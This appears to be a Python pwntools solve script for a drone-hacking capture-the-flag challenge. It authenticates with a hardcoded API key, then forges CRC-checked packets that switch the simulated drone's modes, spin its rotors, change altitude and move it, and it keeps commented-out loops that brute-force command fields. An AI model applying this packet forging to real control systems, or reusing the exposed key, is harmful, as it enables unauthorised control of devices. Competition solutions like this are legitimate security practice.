from pwn import *
import json
import zlib
import IPython
def unsigned32(n):
  return n & 0xFFFFFFFFL

r1 = remote("hackthedrone.eatpwnnosleep.com", 31234)

a = {
    'apikey' : "b21ac804b10c3448f6f77db33945d603eb1764a24fe1a2287c7adae2d041c66a",
}
r1.send(json.dumps(a).encode())
r1.recvuntil("verifed.\n")
print r1.recv(192000)[:-1].decode('hex')
r1.sendline("0c000000ff000000d7cc88ec")
K = r1.recv(192000)[:-1].decode('hex')
uid = int(K[K.find("uid is ")+7:])

def sendcomm(comm,payload=0):
    header = p32(0xe)+p16(uid)+p16(comm)+p16(0)
    crc = unsigned32(zlib.crc32(header))
    header += p32(crc)
    r1.sendline(header.encode('hex'))

def description():
    sendcomm(0x1212)
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    

def print_location():
    sendcomm(0x3030)
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')

def control_rotor(ids,speed):
    header = p32(0xf)+p16(uid)+p16(0x4040)+p8(17+ids)+p16(speed)
    crc = unsigned32(zlib.crc32(header))
    header += p32(crc)
    
    r1.sendline(header.encode('hex'))
    
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')

def change_altitude(at):
    header = p32(0x10)+p16(uid)+p16(0x6666)+p32(at)
    crc = unsigned32(zlib.crc32(header))
    header += p32(crc)
    
    r1.sendline(header.encode('hex'))

    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    

def moveto(x,y):
    header = p32(0x14)+p16(uid)+p16(0x7878)+p32(x)+p32(y)
    crc = unsigned32(zlib.crc32(header))
    header += p32(crc)
    
    r1.sendline(header.encode('hex'))
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')

def change_mode(mode):
    header = p32(0xe)+p16(uid)+p16(0xfefe)+p16(mode)
    crc = unsigned32(zlib.crc32(header))
    header += p32(crc)
    
    r1.sendline(header.encode('hex'))
    
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')
change_mode(1)
print "---"
change_mode(2)
print r1.recvuntil("\n")[:-1].decode('hex')
print "---"
control_rotor(0,0)
control_rotor(1,0)
control_rotor(2,0)
control_rotor(3,0)
control_rotor(0,0xffff)
print r1.recvuntil("\n")[:-1].decode('hex')
control_rotor(1,0xffff)
print r1.recvuntil("\n")[:-1].decode('hex')
control_rotor(2,0xffff)
print r1.recvuntil("\n")[:-1].decode('hex')
control_rotor(3,0xffff)
print r1.recvuntil("\n")[:-1].decode('hex')
print r1.recvuntil("\n")[:-1].decode('hex')
print "---"
change_mode(1)
change_altitude(0x44600000)
'''

for j in range(0x10000):
    header = p32(0xf)+p16(uid)+p16(0x4040)+p16(j)+"\x00"
    crc = unsigned32(zlib.crc32(header))
    header += p32(crc)

    r1.sendline(header.encode('hex'))
    print header.encode('hex')

    r1.recvuntil("\n")[:-1].decode('hex')
    print r1.recvuntil("\n")[:-1].decode('hex')

exit()
'''
sleep(1.5)
print_location()
sleep(1.5)
print_location()

sleep(1.5)
print_location()

sleep(1.5)
moveto(0x42600000,0x42400000)
for i in range(5):
    sleep(2)
    print_location()
print "--------------------"
moveto(0x42600000,0x41800000)
for i in range(5):
    sleep(2)
    print_location()
moveto(0x41c80000,0x41800000)
for i in range(3):
    sleep(2)
    print_location()
print "--------------------"
print r1.recvuntil("\n")[:-1].decode('hex')
print r1.recvuntil("\n")[:-1].decode('hex')

change_altitude(0x30000000)
sleep(1.5)
print_location()
sleep(1.5)
print_location()
sleep(1.5)
print_location()
'''
for k in range(1,8):
    for i in range(k):
        for j in range(0x10):
            header = p32(0xc+k)+p16(uid)+p16(0x7878)+"\x00"*i+chr(j)+"\x00"*(k-1-i)
            crc = unsigned32(zlib.crc32(header))
            header += p32(crc)

            r1.sendline(header.encode('hex'))
            print header.encode('hex')

            r1.recvuntil("\n")[:-1].decode('hex')
            print r1.recvuntil("\n")[:-1].decode('hex')
description()
exit()
'''

print_location()
r1.interactive()
